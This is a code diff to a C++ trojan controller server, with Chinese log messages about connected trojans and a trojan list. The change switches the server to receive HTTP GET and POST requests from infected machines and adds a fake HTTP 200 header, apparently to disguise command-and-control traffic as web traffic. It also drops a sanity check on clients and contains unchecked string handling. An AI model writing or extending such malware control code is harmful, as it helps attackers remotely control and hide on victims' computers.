@@ -39,6 +39,26 @@ CRITICAL_SECTION cs;
 //EnterCriticalSection(&cs);
 //LeaveCriticalSection(&cs);
 
+char* protocolHead = "HTTP/1.1 200 OK\r\nServer: Server <0.1>\r\n"
+"Accept-Ranges: bytes\r\nContent-Length: %d\r\nConnection: close\r\n"
+"Content-Type: %s\r\n\r\n";
+
+
+char * killhead(char* headcmd)
+{
+	return strncpy(headcmd, strstr(headcmd, "\r\n\r\n")+4, MAC_ADDR_LEN);
+}
+
+char* combine(char *s1, char *s2)
+{
+	char *result = (char *)malloc(strlen(s1) + strlen(s2) + 1);
+	if (result == NULL) exit(1);
+	strcpy(result, s1);
+	strcat(result, s2);
+	return result;
+}
+
+
 void init()
 {
 	int i = 0;
@@ -268,15 +288,26 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 	while( TRUE )
 	{
 		memset(RecvBuffer, 0, MAX_PATH);
-		Ret = recvn(ClientSocket, RecvBuffer, MAC_ADDR_LEN);
-		cout << "\n--------------------------------\n连接到木马！mac地址为"<<RecvBuffer << endl;
+		Ret = recv(ClientSocket, RecvBuffer, MAX_PATH,0);
+		if (Ret > 0)
+		{
+			cout << "接收到GET请求：" << RecvBuffer << "(" << Ret << ")" << endl;
+		}
 
-		if ( Ret != MAC_ADDR_LEN ) 
+		memset(RecvBuffer, 0, MAX_PATH);
+		Ret = recv(ClientSocket, RecvBuffer, MAX_PATH,0);
+		if (Ret > 0)
+		{
+			cout << "接收到POST请求：" << RecvBuffer << "(" << Ret << ")" << endl;
+		}
+		cout << "\n--------------------------------\n连接到木马！mac地址为" << killhead(RecvBuffer) << endl;
+
+		/*if ( Ret != MAX_PATH)
 		{
 			cout << "客户端异常，退出!" << endl;
 			remove_trojan_from_list(RecvBuffer);
 			break;
-		}
+		}*/
 		
 		if(bFirst){
 			cout << "添加到木马列表" << endl;
